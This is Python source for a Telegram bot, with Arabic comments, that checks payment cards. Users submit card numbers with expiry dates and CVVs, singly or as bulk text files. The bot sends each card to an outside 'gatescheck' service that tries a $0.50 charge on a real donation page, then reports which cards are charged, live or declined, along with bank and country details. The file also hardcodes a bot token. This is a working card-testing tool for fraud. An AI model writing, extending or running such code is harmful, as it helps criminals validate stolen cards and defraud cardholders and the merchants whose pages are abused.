import os
import time
import asyncio
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'
API_URL = "http://gatescheck.duckdns.org:7000/check"

# ------------------- BIN Lookup -------------------
async def get_bin_info(bin_number):
    url = f"https://lookup.binlist.net/{bin_number}"
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.get(url)
            data = r.json()
        brand = data.get("scheme", "N/A")
        card_type = data.get("type", "N/A")
        bank = data.get("bank", {}).get("name", "N/A")
        country = data.get("country", {}).get("name", "N/A")
        return f"{brand} - {card_type}", bank, country
    except:
        return "N/A", "N/A", "N/A"

# ------------------- Check API -------------------
async def check_card_api(card_full):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": card_full,
        "amount": 0.50
    }
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.get(API_URL, params=params)
            result_raw = r.json().get('result', '')
            result = result_raw.lower()

        if "charge" in result or "success" in result:
            return "approved", "Charge"
        elif "insufficient" in result:
            return "live", "Insufficient Funds"
        else:
            return "declined", result_raw
    except:
        return "declined", "Error"

# ------------------- Format Response -------------------
async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        title = "#Charge ✅"
    elif status == "live":
        title = "#Live 🟢"
    else:
        title = "#Declined ❌"

    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- /pp فردي -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return

    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)

    final = await format_response(card_full, status, response, taken)
    await update.message.reply_text(final)

# ------------------- /check ملف -------------------
async def check_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text("Please send a text file with cards.")
        return

    file = await update.message.document.get_file()
    file_path = f"temp_{update.message.from_user.id}.txt"
    await file.download_to_drive(file_path)

    # اقرأ كل بطاقة
    with open(file_path, "r") as f:
        cards = [line.strip() for line in f if line.strip()]

    os.remove(file_path)  # احذف الملف المؤقت

    await update.message.reply_text(f"Starting check for {len(cards)} cards...")

    for card in cards:
        start_time = time.time()
        status, response = await check_card_api(card)
        taken = round(time.time() - start_time, 2)
        final = await format_response(card, status, response, taken)
        await update.message.reply_text(final)

# ------------------- تشغيل البوت -------------------
def main():
    app = Application.builder().token(TOKEN).build()

    # فردي
    app.add_handler(CommandHandler("pp", pp))
    # ملف
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), check_file))

    print("Bot is running for multiple users...")
    app.run_polling()

if __name__ == "__main__":
    main()
